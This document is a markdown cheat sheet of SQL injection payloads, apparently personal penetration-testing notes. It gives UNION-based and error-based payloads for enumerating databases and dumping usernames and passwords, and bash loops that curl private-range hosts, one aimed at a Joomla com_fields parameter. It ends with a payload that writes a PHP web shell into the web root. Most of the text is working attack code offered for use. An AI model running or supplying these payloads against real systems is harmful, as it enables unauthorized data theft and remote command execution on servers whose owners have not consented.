# sql-injection
## To find sql-injection first break a query or create an error than join it or comment out the rest.
```text
Syntax break = ' " ') ") / \ ; : 
      Use differnt combination of the syntax
 
Join or comment out the rest
    Oracle      =   --comment
    Microsoft   =   --comment, /*comment*/
    PostgreSQL  =   --comment, /*comment*/
    MySQL       =   #comment, --+comment (note the space after the double dash), /*comment*/
 ```
    
## Union based attack

### First check ***columns*** by null value or order by 

```bash
' order by 1--
' union select null,null,null--
# In Oracle   	
  ' union select null,null from dual--
``` 

### then check which colunms contain strings value
```bash
' union select null,'a',null--
# in Oracle 	
  ' union select 'a',null+from+dual--
```

### To check database name 
```bash
UNION SELECT null,table_schema,null from information_schema.tables

# With the use of concat
  ' UNION SELECT 1,concat(table_schema),3,4,5,6,7,8,9 from information_schema.tables--
  UNION SELECT 1,table_schema|| '~' ||table_name,3,4,5,6,7,8,9 from information_schema.tables
```

### To check table name 
```bash
' UNION SELECT null,table_name,NULL FROM information_schema.tables--
# Oracle
  ' union select null,table_name,null from all_tables--
```

### To check column name 
```bash
' union select column_name,null from information_schema.columns where table_name='odm_user'--
# Oracle 
  ' union select column_name,null from all_tab_columns where table_name='table'-- 
```  

### To see username and password from table user
```bash
'union select password,username from users--
'union select null,password||username from users--
'union select null,password|| '~' ||username from users--
```

### Concat
```bash
Oracle      'foo'||'bar'
Microsoft   'foo'+'bar'
PostgreSQL  'foo'||'bar'
MySQL       'foo' 'bar' [Note the space between the two strings]
            'foo'||'bar'
            'foo'|| '~' ||'bar'
            CONCAT('foo','bar')
```

## Error based 

### To find database()
```
1') and extractvalue(0x0a,concat(0x0a,(select database() limit 1))) #
```
### To find table_name
```
1') and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 1,1))) #
```

### to Find columns_name
```
1') and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_name='users' limit 2,1))) #
```

### To find column = password from table = users
```
1') and extractvalue(0x0a,concat(0x0a,(select password from users limit 0,1))) #

				AND

1') and extractvalue(0x0a,concat(0x0a,substring((select password from users limit 0,1) from 30))) #
```


## Few tricks for automating sql injection from terminal 

> We can use 'for loop' extracting data from url   

```bash
for i in {1..90}; do curl "http://192.168.5.106/index.php" -d "option=com_fields&view=fields&layout=modal&list[fullordering]=extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema = database() limit $i,1)))" -s | grep -A3 blockquote | grep "#__" ; done


for i in {0..100}; do curl "http://192.168.5.140/?nid=1%20and%20extractvalue(0x0a,concat(0x0a,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%20$i,1)))%20#" -s | grep '&#039' | grep Array | awk -F\& '{print $1}' ; done


for i in {0..100}; do curl "http://192.168.5.140/?nid=1%20and%20extractvalue(0x0a,concat(0x0a,(select%20column_name%20from%20information_schema.columns%20where%20table_name=%27users%27%20limit%20$i,1)))%20#" -s | grep '&#039' | grep Array | awk -F\& '{print $1}' ; done

```


## To create a reverse shell file 
```bash
' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- 
```






